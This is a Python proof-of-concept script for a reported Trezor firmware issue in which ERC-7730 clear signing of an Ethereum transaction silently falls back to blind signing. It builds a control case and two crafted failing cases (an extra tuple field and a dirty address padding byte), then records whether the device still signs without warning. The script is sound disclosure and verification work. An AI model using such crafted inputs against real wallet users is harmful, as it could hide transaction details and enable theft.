"""PoC for TREZOR-A1 — silent downgrade to blind signing when ERC-7730
clear signing fails (trezor-firmware `core/src/apps/ethereum/sign_tx.py:183-190`).

Method (mirrors trezor-firmware's own device test
`tests/device_tests/ethereum/test_definitions.py`):
* CONTROL: valid ERC-7730 display format + valid calldata for a Uniswap V3
  `exactInputSingle` swap. Expect the clear-signed labels on screen.
* A1a: the same display format, but its tuple claims one EXTRA field, so the
  firmware fails parsing with OutOfBounds (a ClearSigningFailed subclass)
  and silently falls back to blind signing. Expect: clear-signed labels
  ABSENT, no "clear signing" warning anywhere, raw calldata hex shown,
  and the signature still produced.
* A1b: the same valid format, but the calldata's tokenIn address word has a
  dirty padding byte (0x01 in the top byte). The AddressFormatter raises
  DirtyAddress (also ClearSigningFailed). Same expectations as A1a.

Verdict CONFIRMED means: the control proves clear signing works in this
environment, and the failing case still signs with no warning that the
clear-signed view was lost.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from trezorlib import ethereum, messages
from trezorlib.tools import parse_path

from common import fw_info, open_session, run_signing, save_json
from eth_defs import (
    encode_eth_display_format,
    encode_eth_token,
    make_eth_display_format,
)

UNISWAP_V3_ROUTER2 = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
FUNC_SIG_FAKE_STR = "11111111"
FUNC_SIG_FAKE = bytes.fromhex(FUNC_SIG_FAKE_STR)

# exactInputSingle((address,address,uint24,address,uint256,uint256,uint160))
# WETH -> USDT swap, from trezor-firmware's test_definitions.py
UNISWAP_EXACT_INPUT_SINGLE_CALLDATA = bytes.fromhex(
    FUNC_SIG_FAKE_STR
    + "000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"  # tokenIn: WETH
    + "000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7"  # tokenOut: USDT
    + "0000000000000000000000000000000000000000000000000000000000000bb8"  # fee: 3000
    + "00000000000000000000000051117eb63623aee74a39b63bd9efa3a728800dbb"  # recipient
    + "000000000000000000000000000000000000000000000000002386f26fc10000"  # amountIn
    + "0000000000000000000000000000000000000000000000000000000000000010"  # amountOutMinimum
    + "0000000000000000000000000000000000000000000000000000000000000000"  # sqrtPriceLimitX96
)

WETH_TOKEN_DEFINITION = {
    "address": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    "chain_id": 1,
    "symbol": "FAKE WETH",
    "decimals": 18,
    "name": "FAKE Wrapped Ether",
}

LABELS = {"FAKE Amount", "FAKE Minimum to Receive", "FAKE fee", "FAKE recipient"}


def build_display_format(parameter_definitions=None):
    if parameter_definitions is None:
        parameter_definitions = [
            messages.EthereumABIValueInfo(
                tuple=messages.EthereumABITupleInfo(
                    fields=[
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_ADDRESS
                        ),  # tokenIn
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_ADDRESS
                        ),  # tokenOut
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_UINT24
                        ),  # fee
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_ADDRESS
                        ),  # recipient
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_UINT256
                        ),  # amountIn
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_UINT256
                        ),  # amountOutMinimum
                        messages.EthereumABIValueInfo(
                            atomic=messages.EthereumABIType.ABI_UINT160
                        ),  # sqrtPriceLimitX96
                    ],
                    is_dynamic=False,
                )
            )
        ]
    return make_eth_display_format(
        chain_id=1,
        address=UNISWAP_V3_ROUTER2,
        func_sig=FUNC_SIG_FAKE,
        parameter_definitions=parameter_definitions,
        field_definitions=[
            messages.EthereumERC7730FieldInfo(
                path=messages.EthereumERC7730Path(path=[0, 4]),
                label="FAKE Amount",
                token_path=messages.EthereumERC7730Path(path=[0, 0]),
                formatter=messages.EthereumERC7730FieldFormatterType.FORMATTER_TOKEN_AMOUNT,
            ),
            messages.EthereumERC7730FieldInfo(
                path=messages.EthereumERC7730Path(path=[0, 5]),
                label="FAKE Minimum to Receive",
                token_path=messages.EthereumERC7730Path(path=[0, 1]),
                formatter=messages.EthereumERC7730FieldFormatterType.FORMATTER_TOKEN_AMOUNT,
            ),
            messages.EthereumERC7730FieldInfo(
                path=messages.EthereumERC7730Path(path=[0, 2]),
                label="FAKE fee",
                formatter=messages.EthereumERC7730FieldFormatterType.FORMATTER_UNIT,
            ),
            messages.EthereumERC7730FieldInfo(
                path=messages.EthereumERC7730Path(path=[0, 3]),
                label="FAKE recipient",
                decimals=4,
                base="%",
                prefix=False,
                formatter=messages.EthereumERC7730FieldFormatterType.FORMATTER_ADDRESS_NAME,
            ),
        ],
    )


def sign_tx_params(data: bytes) -> dict:
    return dict(
        n=parse_path("m/44h/60h/0h/0/1"),
        nonce=0x0,
        gas_price=0x14,
        gas_limit=0x14,
        to=UNISWAP_V3_ROUTER2,
        value=0x0,
        data=data,
        chain_id=1,
    )


def sign_with_format(session, display_format, data, token=None):
    def _sign(session):
        return ethereum.sign_tx(
            session,
            **sign_tx_params(data),
            definitions=messages.EthereumDefinitions(
                encoded_display_format=encode_eth_display_format(display_format),
                encoded_token=(
                    encode_eth_token(**token) if token is not None else None
                ),
            ),
        )

    return _sign


def analyse(outcome: dict) -> dict:
    pages_text = "\n".join(outcome["pages"])
    compact = "".join(pages_text.split()).lower()
    labels_seen = {label for label in LABELS if label in pages_text}
    return {
        "signed": outcome.get("signed", False),
        "error": outcome.get("error"),
        "signature": outcome.get("signature"),
        "labels_seen": sorted(labels_seen),
        "labels_all_seen": labels_seen == LABELS,
        "labels_none_seen": len(labels_seen) == 0,
        "mentions_clear_signing": "clear signing" in pages_text.lower(),
        "shows_raw_calldata_hex": FUNC_SIG_FAKE_STR in compact,
        "n_pages": len(outcome["pages"]),
        "pages": outcome["pages"],
    }


def main(out_path: str = "poc-results/a1.json", trezor_path: str | None = None) -> dict:
    test_ctx, session = open_session(trezor_path)
    result: dict = {"finding": "TREZOR-A1", "fw": fw_info(session)}

    # CONTROL — valid format + valid calldata + WETH token definition.
    fmt = build_display_format()
    outcome = run_signing(
        test_ctx,
        session,
        sign_with_format(
            session, fmt, UNISWAP_EXACT_INPUT_SINGLE_CALLDATA, token=WETH_TOKEN_DEFINITION
        ),
    )
    result["control"] = analyse(outcome)

    # A1a — mismatched definition: tuple claims an extra UINT256 field.
    # Parsing fails with OutOfBounds (ClearSigningFailed) -> silent fallback.
    base_params = build_display_format().parameter_definitions
    assert base_params[0].tuple is not None
    bad_tuple = messages.EthereumABITupleInfo(
        fields=[
            *base_params[0].tuple.fields,
            messages.EthereumABIValueInfo(atomic=messages.EthereumABIType.ABI_UINT256),
        ],
        is_dynamic=False,
    )
    bad_fmt = build_display_format(
        parameter_definitions=[messages.EthereumABIValueInfo(tuple=bad_tuple)]
    )
    outcome = run_signing(
        test_ctx, session, sign_with_format(session, bad_fmt, UNISWAP_EXACT_INPUT_SINGLE_CALLDATA)
    )
    result["a1a_mismatched_definition"] = analyse(outcome)

    # A1b — dirty address: 0x01 byte in the padding of the tokenIn word.
    dirty = bytearray(UNISWAP_EXACT_INPUT_SINGLE_CALLDATA)
    dirty[4] = 0x01  # first byte of the tokenIn address word
    outcome = run_signing(
        test_ctx, session, sign_with_format(session, fmt, bytes(dirty))
    )
    result["a1b_dirty_address"] = analyse(outcome)

    # Verdict.
    control_ok = (
        result["control"]["labels_all_seen"]
        and result["control"]["signed"]
        and not result["control"]["shows_raw_calldata_hex"]
    )
    result["control_ok"] = control_ok
    for key in ("a1a_mismatched_definition", "a1b_dirty_address"):
        t = result[key]
        t["silent_fallback"] = bool(
            control_ok
            and t["signed"]
            and t["labels_none_seen"]
            and not t["mentions_clear_signing"]
            and t["shows_raw_calldata_hex"]
        )
    result["verdict"] = (
        "CONFIRMED"
        if control_ok
        and result["a1a_mismatched_definition"]["silent_fallback"]
        else ("INCONCLUSIVE" if not control_ok else "NOT_REPRODUCED")
    )
    save_json(result, out_path)
    print(f"A1 verdict: {result['verdict']} (control_ok={control_ok})")
    return result


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--out", default="poc-results/a1.json")
    parser.add_argument("--trezor-path", default=None)
    args = parser.parse_args()
    main(args.out, args.trezor_path)
